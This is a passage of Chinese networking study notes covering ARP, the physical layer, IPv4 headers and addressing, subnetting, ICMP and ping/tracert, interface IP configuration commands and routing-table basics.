Request报文。</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203834076.png" alt="image-20220124203834076"></p><p>若不匹配则不会响应，若匹配则则该主机会 将ARP请求报文中的发送端MAC地址和发送端IP地址信息记录到自己的ARP缓存表中，然后 通过ARP Reply报文进行响应</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124203926268.png" alt="image-20220124203926268"></p><ul><li>主机2会向主机1回应ARP Reply报文。</li><li>ARP Reply报文中的发送端IP地址是主机2自己的IP地址，目的端IP地址是主机1的IP地址， 目的端MAC地址是主机1的MAC地址，发送端MAC地址是自己的MAC地址，同时操作类型 被设置为Reply。</li><li>ARP Reply报文通过单播传送</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204003680.png" alt="image-20220124204003680"></p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>数据到达物理层之后，物理层会根据物理介质的不同，将数字信号转换为光信号、电信号或者是电磁波信号</p><p>物理层的PDU被称为比特流</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204140328.png" alt="image-20220124204140328"></p><h3 id="常见传输介质"><a href="#常见传输介质" class="headerlink" title="常见传输介质"></a>常见传输介质</h3><ul><li>双绞线：当今以太网最常见的传输介质，按照抗电磁干扰能力还可以分为： STP-屏蔽双绞线和UTP-非屏蔽双绞线</li><li>光纤传输，按照功能部件可分为：<ul><li>光纤传输，按照功能部件可分为：</li><li>光模块：将电信号与光信号互转的器件，产生光信号。</li></ul></li><li>串口电缆在WAN（Wide Area Network，广域网）中大规模使用，根据WAN线路类型不同， 串口电缆在设备上连接的接口类型也不同：异/同步串口、ATM接口、POS接口、CE1/PRI 接口等。</li><li>无线信号的传输可以通过电磁波进行，例如：无线路由器将数据通过调制以电磁波发送出 去，移动终端的无线网卡将电磁波解调，得到数据，完成从无线路由器到移动终端的数据 传输。</li></ul><h2 id="数据通信过程"><a href="#数据通信过程" class="headerlink" title="数据通信过程"></a>数据通信过程</h2><p>发送方数据封装-&gt;中间网络数据传输-&gt;接收方数据解封装</p><h3 id="发送方数据封装"><a href="#发送方数据封装" class="headerlink" title="发送方数据封装"></a>发送方数据封装</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204458566.png" alt="image-20220124204458566"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204507478.png" alt="image-20220124204507478"></p><h3 id="中间网络数据传输"><a href="#中间网络数据传输" class="headerlink" title="中间网络数据传输"></a>中间网络数据传输</h3><p>封装好的完整数据，会在网络中被传递</p><p> 一般情况下：</p><ul><li> 网络中的二层设备（如以太网交换机）只会解封装数据的二层头部，根据二层头部的 信息进行相应的“交换”操作。 </li><li> 网络中的三层设备（如路由器）只会解封装到三层头部，并且根据三层头部的信息进 行相应的“路由”操作。</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204629644.png" alt="image-20220124204629644"></p><h3 id="接收方数据解封装"><a href="#接收方数据解封装" class="headerlink" title="接收方数据解封装"></a>接收方数据解封装</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124204656862.png" alt="image-20220124204656862"></p><p> 经过中间网络传递之后，数据最终到达目的服务器。根据不同的协议头部的信息，数据将 被一层层的解封装并做相应的处理和传递，最终交由WEB服务器上的应用程序进行处理。</p><h2 id="分层模型的概念的优势"><a href="#分层模型的概念的优势" class="headerlink" title="分层模型的概念的优势"></a>分层模型的概念的优势</h2><ul><li> 各个层次之间分工、界限明确，有助于各个部件的开发、设计和故障排除。 </li><li> 通过定义在模型的每一层实现什么功能,鼓励产业的标准化。 </li><li> 通过提供接口的方式，使得各种类型的网络硬件和软件能够相互通信，提高兼容性。</li></ul><h1 id="网络层协议及IP编址"><a href="#网络层协议及IP编址" class="headerlink" title="网络层协议及IP编址"></a>网络层协议及IP编址</h1><h2 id="网络层协议"><a href="#网络层协议" class="headerlink" title="网络层协议"></a>网络层协议</h2><p>网络层协议包括IP协议，ICMP协议，IPX协议等</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220127163103508.png" alt="image-20220127163103508"></p><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>ip是Internet Protocol的缩写。Internet Protocol本身是一个协议文件的名称，该协议文件的内容非常少，主要是定义并阐述了IP报文的格式</p><p>经常被提及的IP，一般不是特指Internet Protocol这个协议本身，而是泛指直接或间接与IP协议相关的任何内容。</p><p><strong>作用：</strong>为网络层的设备提供逻辑地址，负责数据包的寻址和转发。</p><p> IPv4（Internet Protocol Version 4）协议族是TCP/IP协议族中最为核心的协议族。它工作在TCP/IP协议栈的网络层，该层与OSI参考模型的网络层相对应。</p><p> IPv6（Internet Protocol Version 6）是网络层协议的第二代标准协议，也被称为IPng （IP Next Generation）。它是Internet工程任务组IETF（Internet Engineering Task  Force）设计的一套规范，是IPv4（Internet Protocol Version 4）的升级版本。</p><h3 id="数据封装"><a href="#数据封装" class="headerlink" title="数据封装"></a>数据封装</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220127163557973.png" alt="image-20220127163557973"></p><p>应用数据需要经过TCP/IP每一层处理之后才能通过网络传输到目的端，每一层上都使用该 层的协议数据单元PDU（Protocol Data Unit）彼此交换信息。</p><p>如上层<strong>数据</strong>在<strong>传输层</strong>添加TCP报头后得到的PDU被称为<strong>Segment（数据段）</strong>；数据段被传递给<strong>网络层</strong>，网络层添加IP报头得到的PDU被称为<strong>Packet（数据包）</strong>；数据包被传递到<strong>数据链路层</strong>，封装数据链路层报头和尾部得到的PDU被称为<strong>Frame（数据帧）</strong>； 最后，帧被转换为<strong>比特</strong>，通过网络介质传输。</p><h3 id="IPV4报文格式"><a href="#IPV4报文格式" class="headerlink" title="IPV4报文格式"></a>IPV4报文格式</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220127163943203.png" alt="image-20220127163943203"></p><ul><li>Version：4 bit，4：表示为IPv4；6：表示为IPv6。</li><li>Header Length：4 bit，首部长度，如果不带Option字段，则为20，最长为60。</li><li>Type of Service：8 bit，服务类型。只有在有QoS差分服务要求时，这个字段才起作用</li><li>Total Length：16 bit，总长度，整个IP数据包的长度。</li><li>Identification：16 bit，标识，分片重组时会用到该字段。</li><li>Flags：3 bit，标志位。<ul><li>保留段位：0，保留。</li><li>不分段位：1，表示“不能分片”；0，表示“能分片”。</li><li>更多段位：1，表示“后面还有分片”；0，表示“最后一个数据片”。</li></ul></li><li>Fragment Offset：12 bit，片偏移，分片重组时会用到该字段。指出较长的分组在分片后， 该片在原分组中的相对位置，与更多段位组合，帮助接收方组合分段的报文。</li><li>Time to Live：8 bit，生存时间。可经过的最多路由数，即数据包在网络中可通过的路由器数的最大值。</li><li>Protocol：8 bit，协议：下一层协议。指出此数据包携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给哪个进程处理。<ul><li>1: ICMP, Internet Control Message；</li><li>2: IGMP, Internet Group Management；</li><li>6: TCP , Transmission Control Protocol；</li><li>17: UDP, User Datagram Protocol。</li></ul></li><li>Header Checksum：16 bit，首部检验和。</li><li>Source IP Address：32 bit，源IP地址。</li><li>Destination IP Address：32 bit，目的IP地址。</li><li>Options：可变，选项字段。</li><li>Padding：可变，填充字段，全填0</li></ul><h3 id="数据包分片"><a href="#数据包分片" class="headerlink" title="数据包分片"></a>数据包分片</h3><p>将报文分割成多个片段的过程叫分片</p><p>网络中转发的ip报文的长度可以不同，但若报文长度超过了数据链路所支持的最大长度，则报文就要分割成若干个较小的片段才能在链路上传输</p><p>与IP数据包包头中的Identification，Flags，Fragment Offset三部分内容有关</p><h3 id="生存时间（Time-to-Live-TTL"><a href="#生存时间（Time-to-Live-TTL" class="headerlink" title="生存时间（Time to Live,TTL)"></a>生存时间（Time to Live,TTL)</h3><p>TTL字段设置了数据包可以经过的路由器数目，一旦经过一个路由器，TTL值减一，当为0时，数据包被丢弃</p><p>报文在网段间转发时，如果网络设备上的路由规划不合理，就可能会出现环路，导致报文在网络中无限循环，无法到达目的端。环路发生后，所有发往这个目的地的报文都会被循环转发，随着这种报文逐渐增多，网络将会发生拥塞。 </p><p>为避免环路导致的网络拥塞，IP报文头中包含一个生存时间TTL（Time To Live）字段。 报文每经过一台三层设备，TTL值减1。初始TTL值由源端设备设置。当报文中的TTL 降为0时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端 发送ICMP错误消息。（注意：网络设备也可被配置为不向源端发送ICMP错误消息。）</p><h3 id="协议号"><a href="#协议号" class="headerlink" title="协议号"></a>协议号</h3><p>目的端的网络层在接收并处理报文以后，需要决定下一步对报文如何处理。IP报文头中的协 议字段标识了将会继续处理报文的协议。</p><p>该字段可以标识网络层协议，如ICMP（Internet Control Message Protocol，因特网控制 报文协议，对应值0x01）；也可以标识上层协议，如TCP（Transmission Control Protocol， 传输控制协议，对应值0x06）、UDP（User Datagram Protocol，用户数据包协议，对应 值0x11）</p><h2 id="IPV4地址介绍"><a href="#IPV4地址介绍" class="headerlink" title="IPV4地址介绍"></a>IPV4地址介绍</h2><p>IP地址是网络中用于标识一个节点（或者网络设备的接口）</p><p>ip地址用于ip报文在网络中的寻址</p><p>在IP网络上，如果用户要将一台计算机连接到Internet上，就需要申请一个IP地址。IP地址 就像现实中的地址，可以标识网络中的一个节点，数据就是通过它来找到目的地的。即我 们通过IP地址实现全球范围内的网络通信。</p><p>IP地址是网络设备接口的属性，不是网络设备本身的属性。当我们说给某台设备分配一个IP 地址时，实质上是指给这台设备的某个接口分配一个IP地址。如果设备有多个接口，通常每 个接口都至少需要一个IP地址。</p><h3 id="IPV4地址的表示"><a href="#IPV4地址的表示" class="headerlink" title="IPV4地址的表示"></a>IPV4地址的表示</h3><p>P地址是长度是<strong>32 bit</strong>，由4个字节组成。为了阅读和书写方便，IP地址通常采用点分 十进制数来表示。</p><p>IPV4地址通常采用点分十进制表示</p><p>IPV4地址范围00000000.00000000.00000000.00000000<del>11111111.11111111.11111111.1111111 1，即0.0.0.0</del>255.255.255.255</p><h3 id="IPV4地址构成"><a href="#IPV4地址构成" class="headerlink" title="IPV4地址构成"></a>IPV4地址构成</h3><p>网络部分（网络号）：用于标识一个网络</p><ul><li>IP地址不能反映任何有关主机位置的地理信息，只能通过网络号码字段判断出 主机属于哪个网络。</li><li>对于网络号相同的设备，无论实际所处的物理位置如何，它们都是处在同一个 网络中。</li></ul><p>主机部分（主机号）：用来区分一个网络内的不同主机</p><p>网络掩码（子网掩码）：区分一个ip地址中的网络部分和主机部分</p><ul><li>网络掩码为32 bit，与IP地址的位数一样，通常也以点分十进制数来表示。</li><li>网络掩码不是一个IP地址，在二进制的表示上是一堆连续的1、后面接一堆连续的0。</li><li>通常将网络掩码中1的个数称为这个网络掩码的长度。如：掩码0.0.0.0的长度是0，掩 码252.0.0.0的长度是6。</li><li>网络掩码一般与IP地址结合使用，其中值为1的比特对应IP地址中的网络位；值为0的 比特对应IP地址中的主机位，以此来辅助我们识别一个IP地址中的网络位与主机位。 即网络掩码中1的个数就是IP地址的网络号的位数，0的个数就是IP地址的主机号的位 数</li></ul><h3 id="IP地址寻址"><a href="#IP地址寻址" class="headerlink" title="IP地址寻址"></a>IP地址寻址</h3><p>网络号用于表示主机所在的网络，，类似于“XX省XX市XX区XX小区”的作用。</p><p>主机号用于表示网络号所定义的网络范围内某个特定的主机接口，类似于门牌号“XX栋XX 号”的作用。</p><p>网络寻址：</p><ul><li>二层网络寻址：可直接通过IP地址，找到对应的主机接口。</li><li>三层网络寻址：利用网关转发来自不同网段之间的数据包。</li></ul><p>网关：</p><ul><li>报文转发过程中，首先需要确定转发路径以及通往目的网段的接口。如果目的主机与 源主机不在同一网段，报文需要先转发到网关，然后通过网关将报文转发到目的网段。</li><li>网关是指接收并处理本地网段主机发送的报文并转发到目的网段的设备。为实现此功能，网关必须知道<strong>目的网段的路由</strong>。网关设备上连接本地网段的接口地址即为该网段 的网关地址。</li></ul><h3 id="IP地址分类（有类编址）"><a href="#IP地址分类（有类编址）" class="headerlink" title="IP地址分类（有类编址）"></a>IP地址分类（有类编址）</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130100808354.png" alt="image-20220130100808354"></p><ul><li>A、B、C、D、E类的类别字段分别是二进制数0、10、110、1110、1111，通过网络 号码字段的前几个比特就可以判断IP地址属于哪一类，这是区分各类地址最简单的方 法。</li><li>A、B、C三类地址是单播IP地址 (除一些特殊地址外)，只有这三类地址才能分配给主 机接口使用。</li><li>D类地址属于组播IP地址。</li><li>E类地址专门用于特殊的实验目的。</li></ul><p>A,B,C类地址比较</p><ul><li>使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。</li><li>使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。</li><li>B类网络的网络号为16 bit，介于A类和C类网络之间；首两位恒定为10，地址空间为： 128.0.0.0~191.255.255.255。</li><li>C类网络的网络号为24 bit，个数很多，但所允许的主机接口的个数就很少；首三位恒 定为110，地址空间为：192.0.0.0~223.255.255.255。</li></ul><p>组播地址：组播能实现一对多传递消息。</p><h3 id="IP地址类型"><a href="#IP地址类型" class="headerlink" title="IP地址类型"></a>IP地址类型</h3><p>网段：一个网络号所定义的网络范围</p><p>网络地址：用于标识一个网络</p><ul><li>网络号为X，主机号的每个比特都为0。</li><li>不能分配给具体的主机接口使用。</li></ul><p>广播地址：用于向该网络中的所有主机发送数据的特殊地址</p><ul><li>网络号为X，主机号的每个比特都为1。</li><li>不能分配给具体的主机接口使用。</li></ul><p>可用地址：又称主机地址，可用分配给具体的主机接口使用。</p><p>一个网段的主机位为n位，则IP地址数为：2ⁿ，可用IP地址数为：2ⁿ-2 (减去网络地址 和广播地址)。</p><h3 id="私网IP地址"><a href="#私网IP地址" class="headerlink" title="私网IP地址"></a>私网IP地址</h3><p>公网IP地址：由IANA统一分配，以保证任何一个IP地址在Internet上的唯一性，这里的IP地址是指公网IP地址。</p><p>私网IP地址：私网IP地址的使用使得网络可以得到更为自由地扩展，因为同一个私网 IP地址是可以在不同的私有网络中重复使用的。在IP地址空间中，A,B,C三类地址各预留了一些地址专门用于私网IP地址</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130104358434.png" alt="image-20220130104358434"></p><p>私有网络连接到Internet：私有网络由于使用了私网IP地址，是不允许连接到Internet的。 后来在实际需求的驱动下，许多私有网络也希望能够连接到Internet上，从而实现私网与 Internet之间的通信，以及通过Internet实现私网与私网之间的通信。私网与Internet的互联， 必须使用网络地址转换 (NAT)技术实现。</p><p>NAT (Network Address Translation)，网络地址转换，其基本作用是实现私网IP地址 与公网IP地址之间的转换。</p><h3 id="特殊IP地址"><a href="#特殊IP地址" class="headerlink" title="特殊IP地址"></a>特殊IP地址</h3><p>255.255.255.255：可作为目的地址发往网段所有主机（受限于网关）</p><ul><li>这个地址称为有限广播地址，它可以作为一个IP报文的目的IP地址使用。</li><li>路由器接收到目的IP地址为有限广播地址的IP报文后，会停止对该IP报文的转发。</li></ul><p>0.0.0.0：</p><ul><li>如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。</li><li>如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。</li></ul><p>127.0.0.1/8：</p><ul><li>这个地址为环回地址，它可以作为一个IP报文的目的IP地址使用。其作用是测试设备 自身的软件系统。</li><li>一个设备产生的、目的IP地址为环回地址的IP报文是不可能离开这个设备本身的</li></ul><p>169.254.0.0/16：</p><ul><li>如果一个网络设备获取IP地址的方式被设置成了自动获取方式，但是该设备在网络上又没有找到可用的DHCP（动态主机配置协议，用于动态分配网络配置参数，如IP地址）服务器，那么该设备就会使用169.254.0.0/16网段的某个地 址来进行临时通信。</li></ul><p>IPV4与IPV6</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130105012576.png" alt="image-20220130105012576"></p><h3 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h3><p>“有类编址”的地址划分过于死板，划分的颗粒度太大，会有大量的主机号不能被充分利 用，从而造成了大量的IP地址资源浪费。因此可以利用子网划分来减少地址浪费，即VLSM (Variable Length Subnet Mask)，可变 长子网掩码。将一个大的有类网络，划分成若干个小的子网，使得IP地址的使用更为科学。</p><h3 id="如何进行子网划分"><a href="#如何进行子网划分" class="headerlink" title="如何进行子网划分"></a>如何进行子网划分</h3><h4 id="原网段分析"><a href="#原网段分析" class="headerlink" title="原网段分析"></a>原网段分析</h4><p>假设有一个C类网段地址：192.168.10.0；默认情况下，网络掩码为24位，包括24位网络位， 8位主机位。通过计算可知，这样的网络中，有256个IP地址（2的8次方）。</p><h4 id="向主机借位，形成子网"><a href="#向主机借位，形成子网" class="headerlink" title="向主机借位，形成子网"></a>向主机借位，形成子网</h4><p>现在，将原有的24位网络位向主机位去“借”1位，这样网络位就扩充到了25位，相对的主 机位就减少到了7位，而借过来的这1位就是<strong>子网位</strong>，此时网络掩码就变成了25位，即 255.255.255.128，或/25。</p><p>子网位：可取值0或取值1，则得到了两个新的子网。</p><p>通过计算可知，现在网络中，有128个IP地址</p><h4 id="计算子网网络地址"><a href="#计算子网网络地址" class="headerlink" title="计算子网网络地址"></a>计算子网网络地址</h4><p>计算网络地址，主机位全为0：</p><ul><li>计算网络地址，主机位全为0：</li><li>如果子网位取值1，则网络地址为192.168.10.128/25</li></ul><h4 id="计算子网广播地址"><a href="#计算子网广播地址" class="headerlink" title="计算子网广播地址"></a>计算子网广播地址</h4><p>计算广播地址，主机位全为1：</p><ul><li>如果子网位取值0，则网络地址为192.168.10.127/25。</li><li>如果子网位取值1，则网络地址为192.168.10.255/25。</li></ul><h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><p>是IP协议的辅助协议，用来在网络设备间传递各种差错和控制信息，对于收集各种网络信息、诊断和排除各种网络故障等方面起着至关重要的作用。</p><ul><li>为了更有效地转发IP数据报文和提高数据报文交互成功的机会，在网络层使用ICMP协议。 ICMP允许主机或设备报告差错情况和提供有关异常情况的报告。</li></ul><ul><li><p>ICMP消息：</p><ul><li>ICMP消息封装在IP报文中，IP报文头部Protocol值为1时表示ICMP协议。</li><li>字段解释：<ul><li>ICMP消息的格式取决于Type和Code字段，其中Type字段为消息类型，Code字 段包含该消息类型的具体参数。</li><li>校验和字段用于检查消息是否完整。</li><li>消息中包含32 bit的可变参数，这个字段一般不使用，通常设置为0。<ul><li>在ICMP重定向消息中，这个字段用来指定网关IP地址，主机根据这个地 址将报文重定向到指定网关。</li><li>在Echo请求消息中，这个字段包含标识符和序号，源端根据这两个参数 将收到的回复消息与本端发送的Echo请求消息进行关联。尤其是当源端 向目的端发送了多个Echo请求消息时，需要根据标识符和序号将Echo请 求和回复消息进行一一对应</li></ul></li></ul></li></ul></li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130202630726.png" alt="image-20220130202630726"></p><h4 id="ICMP重定向"><a href="#ICMP重定向" class="headerlink" title="ICMP重定向"></a>ICMP重定向</h4><p>ICMP重定向报文是ICMP控制报文中的一种。在特定的情况下，当路由器检测到一台机器使用非最优路由的时候，它会向该主机发送一个ICMP重定向报文，请求主机改变路由</p><p>过程：</p><ul><li>主机A希望发送报文到服务器A，于是根据配置的默认网关地址向网关RTB发送报文。</li><li>网关RTB收到报文后，检查报文信息，发现报文应该转发到与源主机在同一网段的另 一个网关设备RTA，此转发路径是更优的路径，所以RTB会向主机发送一个Redirect 消息，通知主机直接向另一个网关RTA发送该报文。</li><li>主机收到Redirect消息后，会向RTA发送报文，然后RTA会将该报文再转发给服务器 A</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130205207831.png" alt="image-20220130205207831"></p><h3 id="ICMP差错检测"><a href="#ICMP差错检测" class="headerlink" title="ICMP差错检测"></a>ICMP差错检测</h3><p>ICMP Echo消息常用于诊断源和目的地之间的网络连通性，同时还可以提供其他信息，如报文往返时间等</p><p>ICMP的一个典型应用是Ping。Ping是检测网络连通性的常用工具，同时也能够收集其他相 关信息。用户可以在Ping命令中指定不同参数，如ICMP报文长度、发送的ICMP报文个数、 等待回复响应的超时时间等，设备根据配置的参数来构造并发送ICMP报文，进行Ping测试。ping常用于探测到达目的节点的网络可达性</p><h3 id="ICMP错误报告"><a href="#ICMP错误报告" class="headerlink" title="ICMP错误报告"></a>ICMP错误报告</h3><p>ICMP定义了各种错误消息，用于诊断网络连接性问题；根据这些错误消息，源设备可以判 断出数据传输失败的原因。</p><ul><li>如果网络中发生了环路，导致报文在网络中循环，且最终TTL超时，这种情况下网络 设备会发送TTL超时消息给发送端设备。</li><li>如果目的地不可达，则中间的网络设备会发送目的不可达消息给发送端设备。目的不 可达的情况有多种，如果是网络设备无法找到目的网络，则发送目的网络不可达消息； 如果网络设备无法找到目的网络中的目的主机，则发送目的主机不可达消息。</li></ul><p>ICMP的另一个典型应用是Tracert。<strong>Tracert基于报文头中的TTL值来逐跳跟踪报文的转发路径。</strong>为了跟踪到达某特定目的地址的路径，源端首先将报文的TTL值设置为1。该报文到达第一个节点后，TTL超时，于是该节点向源端发送TTL超时消息，消息中携带时间戳。然后 源端将报文的TTL值设置为2，报文到达第二个节点后超时，该节点同样返回TTL超时消息， 以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经 过的每一个节点，并根据时间戳信息计算往返时间。Tracert是检测网络丢包和时延的有效手段，同时可以帮助管理源发现网络中的路由环路</p><h2 id="IPV4地址配置及基本应用"><a href="#IPV4地址配置及基本应用" class="headerlink" title="IPV4地址配置及基本应用"></a>IPV4地址配置及基本应用</h2><h3 id="IP地址的基础配置命令"><a href="#IP地址的基础配置命令" class="headerlink" title="IP地址的基础配置命令"></a>IP地址的基础配置命令</h3><p><strong>进入接口视图：</strong></p><pre class="language-none"><code class="language-none">interface interface-type interface-number</code></pre><p>*interface-type interface-number:*指定接口类型和接口编号。接口类型和接口编号之间可以输入空格也可以不输</p><p><strong>配置接口的IP地址</strong></p><pre class="language-none"><code class="language-none">ip address ip-address&#123;mask|mask-length&#125;</code></pre><p>在接口视图下，通过此命令来给网络设备上的接口配置ip地址，实现网络的互连。</p><p>ip-address：指定接口的ip地址，点分十进制形式</p><p>mask：指定子网掩码，点分十进制形式</p><p>mask-length：指定掩码长度，整数形式，取值范围是0-32.</p><h3 id="案例：配置接口ip地址"><a href="#案例：配置接口ip地址" class="headerlink" title="案例：配置接口ip地址"></a>案例：配置接口ip地址</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130214110005.png" alt="image-20220130214110005"></p><ul><li>物理接口：物理接口是指网络设备上实际存在的接口，分为负责承担业务传输的业务接口 和负责管理设备的管理接口，例如GE业务接口和MEth管理接口。</li><li>逻辑接口：逻辑接口是指能够实现数据交换功能但物理上不存在、需要通过配置建立的接 口，需要承担业务传输，例如VLANIF接口、Loopback接口。<ul><li>Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。<ul><li>Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。</li><li>Loopback接口配置IP地址后，就可以对外发布。Loopback接口上可以配置32位 掩码的IP地址，达到节省地址空间的目的。</li><li>Loopback接口不能封装任何链路层协议，数据链路层也就不存在协商问题，其 协议状态永远都是Up。</li><li>对于目的地址不是本地IP地址，出接口是本地Loopback接口的报文，设备会将 其直接丢弃。</li></ul></li></ul></li></ul><h3 id="网络IP地址规划"><a href="#网络IP地址规划" class="headerlink" title="网络IP地址规划"></a>网络IP地址规划</h3><p>规划目标：易管理、易扩展、利用率高。</p><p>规划原则：</p><ul><li>唯一性：一个IP网络中不能有两个主机采用相同的IP地址。</li><li>连续性：连续地址在层次结构网络中易于进行路由汇总，大大缩减路由表，提高路由 计算的效率、加速路由收敛。</li><li>扩展性：地址分配在每一层次上都要有合理的预留，在网络规模扩展时能保证路由汇 总所需的连续性。避免网络扩展造成的地址、路由重新规划。</li><li>结构化、业务相关性：地址规划与网络拓扑结构和网络承载业务结合起来，便于路由 规划和QoS部署。好的IP地址规划使得每个地址都具有实际含义，看到一个地址就可 以大致判断出该地址所属的设备和对应的业务。</li></ul><h1 id="IP路由基础"><a href="#IP路由基础" class="headerlink" title="IP路由基础"></a>IP路由基础</h1><h2 id="路由概述"><a href="#路由概述" class="headerlink" title="路由概述"></a>路由概述</h2><ul><li>当路由器从多种不同的途径获知到达同一个目的网段的路由(这些路由的目的网络地址及网络掩码均相同)时，会优先路由优先级值最小的路由；如果这些路由学习自相同的路由协议，则优选度量值最优的。总之，<strong>最优的路由加入路由表</strong></li><li>当路由器收到一个数据包时，会在自己的路由表里查询数据包的目的IP地址，如果能够找到匹配的路由表项，则依据表项所指示的出接口及下一跳来转发数据；如果没有匹配的表现则丢弃该数据包</li><li>路由器的行为是逐级跳的，数据包从源到目的地沿路径每个路由器都必须有关于目标网段的路由，否则就会造成丢包</li><li>数据通信往往是双向的，因此要关注流量的往返(往返路由)</li></ul><h3 id="路由基本概念"><a href="#路由基本概念" class="headerlink" title="路由基本概念"></a>路由基本概念</h3><p>通过IP地址能够寻找到一个唯一的网络节点，每个IP都有自己所属的网段，这些网络可能分 布在世界各地，共同组成了全球的网络。</p><p>为了实现不同网段之间的相互通信，网络设备需要能够转发来自不同网段的IP报文，将其送 达不同的IP网段</p><p><strong>路由</strong></p><ul><li>路由是指导报文转发的路径信息，通过路由可以确认转发IP报文的路径</li><li>路由设备是依据路由转发报文到目的网段的网络设备，最常见的路由设备：路由器</li><li>路由设备维护着一张路由表，保存着路由信息</li><li> 网关以及中间节点（路由器）根据收到的IP报文其目的地址选择一条合适的路径，并将报文 转发到下一个路由器。在路径中的最后一跳路由器二层寻址将报文转发给目的主机。这个 过程被称为路由转发。</li><li>中间节点选择路径所依赖的表项为称为路由表。</li><li>路由条目包含明确的出接口以及下一跳，这两项信息指导IP报文转发到相应的下一跳设备上</li></ul><p><strong>路由信息</strong></p><p><strong>目的网络：</strong>标识目的网段</p><p><strong>掩码：</strong>与目的地址共同标识一个网段</p><p><strong>出接口：</strong>数据包被路由后离开本路由的接口</p><p><strong>下一跳：</strong>路由器转发到达目的网段的数据包所使用的下一跳地址</p><p>这些信息标识了目的网段、明确了转发ip报文的路径</p><ul><li>通过路由中包含的信息，路由设备可以转发IP报文到相应的路径。</li><li>目的地址、掩码用于识别IP报文目的地址，路由设备将IP报文匹配到相应的路由之后，根据 路由的出接口、下一跳确认转发的路径。</li><li>只有出接口并不能够确认转发IP报文的下一跳设备，还需要明确的下一跳设备地址。</li></ul><p><strong>路由表</strong></p><ul><li>路由器通过各种方式发现路由</li><li>路由器选择最优的路由条目放入路由表中</li><li>路由器指导设备对ip报文的转发</li><li>路由器通过对路由表的管理实现对路径的信息管理</li><li>路由器依据路由表转发报文。</li><li>路由表由一条条详细的路由条目组成。</li><li>路由表由路由条目组成，但不代表路由表中保存了所有路由，路由表中只会保存“最优的” 路由。</li><li>对路由表中的路由条目的管理实际上就是路由器维护、管理路由信息的具体实现</li></ul><h3 id="路由条目生成"><a href="#路由条目生成" class="headerlink" title="路由条目生成"></a>路由条目生成</h3><p><strong>路由信息获取方式</strong></p><p>路由器依据路由表进行路由转发，为实现路由转发，路由器需要发现路由。常见的有直连路由、静态路由和动态路由</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206223048985.png" alt="image-20220206223048985"></p><p>直连接口所在网段的路由，由设备自动生成。</p><p>直连接口所在网段的路由，由设备自动生成。</p><p>动态路由：路由器通过动态路由协议（如OSPF、IS-IS、BGP等）学习到的路由</p><p><strong>直连路由</strong></p><p>直连路由指向本地直连网络的路由，由设备自动生成</p><p>当路由器为路由转发的最后一跳路由器时，IP报文匹配直连路由，路由器转发IP报文到目的主机</p><p>使用直连路由进行路由转发时，报文的目的IP和路由器接口IP在一个网段内</p><p>当匹配中直连路由进行转发时，此时路由器会查看ARP表项，将报文直接转到目的地址，此 